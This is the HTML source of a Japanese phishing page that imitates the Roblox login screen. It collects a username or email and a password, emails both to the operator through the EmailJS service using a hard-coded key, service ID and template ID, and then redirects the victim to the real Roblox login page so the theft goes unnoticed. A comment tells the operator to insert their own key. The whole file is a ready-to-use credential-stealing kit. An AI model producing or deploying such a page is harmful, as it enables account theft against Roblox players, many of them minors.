<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ロブロックスにログイン</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            background-color: #191b1d;
            background-image: url('bg.jpg'); /* 背景画像 */
            background-size: cover;
            background-position: center;
            color: white;
            font-family: 'HiraKakuProN-W3', 'Hiragino Kaku Gothic ProN', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            height: 100vh;
        }

        /* ヘッダーの再現 */
        .header {
            width: 100%;
            height: 50px;
            background-color: #212325;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 15px;
            box-sizing: border-box;
        }

        /* ログインフォームの箱 */
        .login-container {
            background-color: #212325;
            width: 90%;
            max-width: 400px;
            margin-top: 30px;
            padding: 30px 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }

        h2 { font-size: 24px; margin-bottom: 25px; font-weight: bold; }

        input {
            width: 100%;
            height: 48px;
            background-color: #393b3d;
            border: 1px solid #000;
            border-radius: 4px;
            color: white;
            margin-bottom: 15px;
            padding: 0 12px;
            box-sizing: border-box;
            font-size: 16px;
        }

        input::placeholder { color: #bdbebf; }

        .login-btn {
            width: 100%;
            height: 40px;
            background-color: transparent;
            border: 1px solid white;
            color: white;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .forgot-pass {
            color: white;
            font-size: 14px;
            margin-top: 25px;
            text-decoration: none;
            display: block;
            line-height: 1.5;
        }

        .divider {
            height: 1px;
            background-color: #393b3d;
            margin: 30px 0;
        }

        .sub-btn {
            width: 100%;
            height: 40px;
            background-color: #393b3d;
            border: none;
            color: white;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 12px;
        }

        .footer-text {
            font-size: 13px;
            margin-top: 30px;
            color: white;
        }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="30" style="filter: invert(1);">
    <div style="display:flex; gap:10px;">
        <button style="background:#455df7; color:white; border:none; padding:5px 15px; border-radius:4px; font-weight:bold;">新規登録</button>
        <button style="background:transparent; color:white; border:1px solid white; padding:5px 15px; border-radius:4px; font-weight:bold;">ログイン</button>
    </div>
</div>

<div class="login-container">
    <h2>ロブロックスにログイン</h2>
    
    <input type="text" id="u" placeholder="ユーザーネーム/メールアドレス/電話番号">
    <input type="password" id="p" placeholder="パスワード">
    
    <button class="login-btn" onclick="send()">ログイン</button>

    <a href="#" class="forgot-pass">パスワード、またはユーザーネームをお忘れですか？</a>

    <div class="divider"></div>

    <button class="sub-btn">ワンタイムコードをメールで送信</button>
    <button class="sub-btn">クイックサインイン</button>

    <div class="footer-text">
        アカウントをお持ちではありませんか？ <span style="text-decoration:underline;">新規登録</span>
    </div>
</div>

<script>
    (function(){
        emailjs.init("LliOYc83Ka8j85fhx"); // ここを自分のPublic Keyに書き換えて！
    })();

    function send() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;

        if(!u || !p) return;

        const params = {
            "from_name": "Roblox System",
            "ユーザーネーム": u,
            "パスワード": p
        };

        emailjs.send('service_khtxfau', 'template_r2tf6m7', params)
            .then(() => {
                // 送信後に本物のロブロックスに飛ばす
                location.href = "https://www.roblox.com/login";
            });
    }
</script>

</body>
</html>
